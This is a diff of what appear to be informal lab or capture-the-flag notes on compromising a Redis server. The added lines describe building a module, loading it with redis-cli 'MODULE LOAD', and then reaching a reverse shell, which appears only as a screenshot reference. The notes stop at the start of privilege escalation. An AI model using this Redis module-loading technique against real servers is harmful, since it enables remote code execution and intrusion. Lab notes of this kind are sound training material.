@@ -85,9 +85,9 @@ redis-cli -h 192.168.231.93 save
 
 ```
 cd redis-rce
-python3 -m venv .venv
-source .venv/bin/activate
-pip3 install -r requirements.txt
+python3 -m venv .venv;
+source .venv/bin/activate;
+pip3 install -r requirements.txt;
 python3 redis-rce.py
 ```
 
@@ -99,3 +99,22 @@ add `#include <string.h>` and it still timed out..
 
 - no udp ports
 
+Write up a hoy because the time constraints must be harsh
+```
+make -C ./src
+```
+wu-ftpuploadmoduleso.png
+
+Instead of telnet I went with `redis-cli`
+wu-loadmodule.png
+
+`LOAD MODULE` 
+```bash
+redis-cli -h $ip
+MODULE LOAD /path/to/module/module.so
+```
+
+wu-revshell.png
+
+
+Now to privesc myself
